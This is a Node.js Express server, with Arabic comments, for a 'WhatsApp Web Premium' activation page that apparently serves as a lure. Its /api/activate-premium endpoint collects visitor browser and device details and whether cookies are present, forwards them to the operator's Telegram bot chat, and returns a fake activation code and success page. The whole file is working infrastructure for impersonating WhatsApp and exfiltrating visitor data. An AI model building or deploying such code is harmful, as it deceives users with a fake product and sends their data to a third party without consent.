const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(path.join(__dirname, '.')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API جديد مبسط لإرسال البيانات
app.post('/api/activate-premium', async (req, res) => {
    console.log('🎯 طلب تفعيل جديد ورد:', req.body);
    
    try {
        const userData = req.body;
        
        // التحقق من البيانات الأساسية
        if (!userData) {
            return res.status(400).json({
                success: false,
                error: 'لا توجد بيانات'
            });
        }

        // إرسال البيانات إلى التلجرام
        const telegramResult = await sendToTelegram(userData);
        
        if (telegramResult.success) {
            console.log('✅ تم إرسال البيانات إلى التلجرام بنجاح');
            res.json({
                success: true,
                message: 'تم تفعيل النسخة المميزة بنجاح!',
                data: {
                    activationCode: generateActivationCode(),
                    expiryDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(), // 30 يوم
                    features: ['واجهة متقدمة', 'إشعارات فورية', 'دعم فني']
                }
            });
        } else {
            throw new Error(telegramResult.error);
        }

    } catch (error) {
        console.error('❌ خطأ في تفعيل البريميوم:', error);
        res.status(500).json({
            success: false,
            error: 'فشل في التفعيل: ' + error.message
        });
    }
});

// دالة إرسال البيانات إلى التلجرام
async function sendToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        // التحقق من الإعدادات
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('❌ إعدادات التلجرام مفقودة:', {
                token: !!TELEGRAM_BOT_TOKEN,
                chatId: !!TELEGRAM_CHAT_ID
            });
            return { success: false, error: 'إعدادات التلجرام غير مكتملة' };
        }

        // بناء رسالة التلجرام
        const telegramMessage = `
🎯 **طلب تفعيل جديد - واتساب ويب بريميوم**

📱 **معلومات الجهاز:**
• المتصفح: ${userData.userAgent?.split('/')[0] || 'غير معروف'}
• النظام: ${userData.platform || 'غير معروف'} 
• اللغة: ${userData.language || 'غير معروف'}
• الشاشة: ${userData.screen || 'غير معروف'}
• المنطقة: ${userData.timezone || 'غير معروف'}

🌐 **معلومات الشبكة:**
• الرابط: ${userData.url || 'غير معروف'}
• الريفيرر: ${userData.referrer || 'لا يوجد'}

🕒 **الوقت:** ${new Date().toLocaleString('ar-SA')}
📍 **المنطقة الزمنية:** ${userData.timezone || 'غير معروف'}

🔍 **الكوكيز:** ${userData.cookies && userData.cookies !== 'لا توجد كوكيز' ? 
    '✅ موجودة' : '❌ غير موجودة'}

${userData.additionalInfo ? `📝 **معلومات إضافية:**\n${userData.additionalInfo}` : ''}
        `.trim();

        console.log('📤 جاري الإرسال إلى التلجرام...');

        // إرسال الرسالة إلى التلجرام
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'Markdown'
            })
        });

        const result = await telegramResponse.json();

        if (!telegramResponse.ok) {
            console.error('❌ خطأ من التلجرام:', result);
            return { 
                success: false, 
                error: result.description || 'خطأ في إرسال التلجرام' 
            };
        }

        console.log('✅ تم الإرسال إلى التلجرام بنجاح');
        return { success: true, messageId: result.result.message_id };

    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error);
        return { success: false, error: error.message };
    }
}

// دالة إنشاء كود تفعيل
function generateActivationCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 12; i++) {
        if (i > 0 && i % 4 === 0) code += '-';
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: '✅ يعمل', 
        timestamp: new Date().toISOString(),
        service: 'WhatsApp Web Premium',
        version: '2.0.0',
        telegramConfigured: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID)
    });
});

// endpoint لفحص الإعدادات
app.get('/config-check', (req, res) => {
    const hasToken = !!process.env.TELEGRAM_BOT_TOKEN;
    const hasChatId = !!process.env.TELEGRAM_CHAT_ID;
    
    res.json({
        telegram: {
            token: hasToken ? '✅ موجود' : '❌ مفقود',
            chatId: hasChatId ? '✅ موجود' : '❌ مفقود',
            tokenPreview: hasToken ? 
                process.env.TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' : 'غير معروف',
            status: hasToken && hasChatId ? '✅ جاهز' : '❌ غير مكتمل'
        },
        server: {
            environment: process.env.NODE_ENV || 'development',
            port: PORT,
            uptime: Math.floor(process.uptime()) + ' ثانية'
        }
    });
});

// endpoint لاختبار التلجرام
app.post('/test-telegram', async (req, res) => {
    try {
        const testData = {
            userAgent: 'Test Agent',
            platform: 'Test Platform',
            language: 'ar',
            screen: '1920x1080',
            timezone: 'Asia/Riyadh',
            url: 'https://example.com',
            referrer: 'https://test.com',
            cookies: 'test_cookie=value',
            timestamp: new Date().toISOString()
        };

        const result = await sendToTelegram(testData);
        
        res.json({
            success: result.success,
            message: result.success ? 
                '✅ تم اختبار التلجرام بنجاح' : 
                '❌ فشل اختبار التلجرام',
            error: result.error
        });

    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// صفحة التفعيل الناجح
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تم التفعيل بنجاح</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    background: linear-gradient(135deg, #25D366, #128C7E);
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh; 
                    margin: 0; 
                }
                .success-box { 
                    background: white; 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center; 
                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                }
                .success-icon { 
                    font-size: 80px; 
                    margin-bottom: 20px; 
                }
            </style>
        </head>
        <body>
            <div class="success-box">
                <div class="success-icon">🎉</div>
                <h1>تم التفعيل بنجاح!</h1>
                <p>شكراً لاستخدامك واتساب ويب النسخة المميزة</p>
                <p>يمكنك الآن الاستمتاع بجميع المميزات</p>
            </div>
        </body>
        </html>
    `);
});

// التعامل مع الأخطاء
app.use((err, req, res, next) => {
    console.error('❌ خطأ غير متوقع:', err);
    res.status(500).json({
        success: false,
        error: 'حدث خطأ غير متوقع في السيرفر'
    });
});

// التعامل مع المسارات غير الموجودة
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'الصفحة غير موجودة'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 =================================');
    console.log('🚀 سيرفر واتساب ويب بريميوم يعمل!');
    console.log(`🚀 البورت: ${PORT}`);
    console.log(`🔑 التوكين: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ موجود' : '❌ مفقود'}`);
    console.log(`💬 الآيدي: ${process.env.TELEGRAM_CHAT_ID ? '✅ موجود' : '❌ مفقود'}`);
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
    console.log('🔍 للفحص:', `http://localhost:${PORT}/config-check`);
    console.log('❤️  الصحة:', `http://localhost:${PORT}/health`);
    console.log('🚀 =================================');
});
